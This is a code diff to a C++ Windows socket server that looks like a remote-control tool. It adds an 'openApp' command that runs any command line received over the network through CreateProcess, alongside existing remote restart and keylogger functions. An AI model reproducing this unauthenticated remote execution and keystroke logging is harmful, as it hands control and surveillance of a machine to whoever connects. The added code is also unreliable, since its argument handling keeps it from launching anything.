@@ -230,8 +230,18 @@ void Server::handleClient(SOCKET clientSocket) {
             } else if (receivedMessage == "listApp"){
                 std::cout << "List app command received." << std::endl;
                 ListApplications(clientSocket);
-                copyFileAndSend(clientSocket, "application.txt", "copy_application.txt");
+                // copyFileAndSend(clientSocket, "application.txt", "copy_application.txt");
                 break;
+            }
+            else if(receivedMessage.substr(0, 7) == "openApp"){
+                std::cout << "Open app command receive." << std::endl;
+                std::string appName = receivedMessage.substr(9);
+                size_t size = appName.size() + 1;  // Including null terminator
+                TCHAR* appNameTChar = new TCHAR[size];
+                
+                MultiByteToWideChar(CP_UTF8, 0, appName.c_str(), -1, appNameTChar, size);
+                openApp(1, &appNameTChar, clientSocket);
+                delete[] appNameTChar;
             }
             // else if (receivedMessage == "screenshot") {
             //     std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
@@ -329,7 +339,6 @@ void Server::shutdownServer() {
     WSACleanup();
 }
 
-
 void Server::restartServer(){
     // Execute Windows shutdown command
     int result = system("shutdown /r /t 0");
@@ -341,7 +350,6 @@ void Server::restartServer(){
     // Optionally, clean up Winsock resources before shutdown
     WSACleanup();
 }
-
 
 //Keylogger
 void Server::startKeyLogger() {
@@ -401,7 +409,6 @@ void Server::keyLogger() {
     outputFile.close();  
 }
 
-
 bool Server::hasVisibleWindow(DWORD processID) {
     HWND hwnd = GetTopWindow(NULL);
     while (hwnd) {
@@ -445,3 +452,45 @@ void Server::ListApplications(SOCKET clientSocket) {
     outfile.close();
 }
 
+//open/close app https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes?redirectedfrom=MSDN
+void Server::openApp(int argc, TCHAR *argv[], SOCKET clientSocket)
+{
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory( &si, sizeof(si) );
+    si.cb = sizeof(si);
+    ZeroMemory( &pi, sizeof(pi) );
+
+    if( argc != 2 )
+    {
+        printf("Usage: %s [cmdline]\n", argv[0]);
+        return;
+    }
+
+    // Start the child process. 
+    if( !CreateProcess( NULL,   // No module name (use command line)
+        argv[1],        // Command line
+        NULL,           // Process handle not inheritable
+        NULL,           // Thread handle not inheritable
+        FALSE,          // Set handle inheritance to FALSE
+        0,              // No creation flags
+        NULL,           // Use parent's environment block
+        NULL,           // Use parent's starting directory 
+        &si,            // Pointer to STARTUPINFO structure
+        &pi )           // Pointer to PROCESS_INFORMATION structure
+    ) 
+    {
+        printf( "CreateProcess failed (%d).\n", GetLastError() );
+        return;
+    }
+
+    // Wait until child process exits.
+    WaitForSingleObject( pi.hProcess, INFINITE );
+
+    // Close process and thread handles. 
+    CloseHandle( pi.hProcess );
+    CloseHandle( pi.hThread );
+    std::string message = "Sucessfully open file";
+    send(clientSocket, message.c_str(), message.size(), 0);
+}
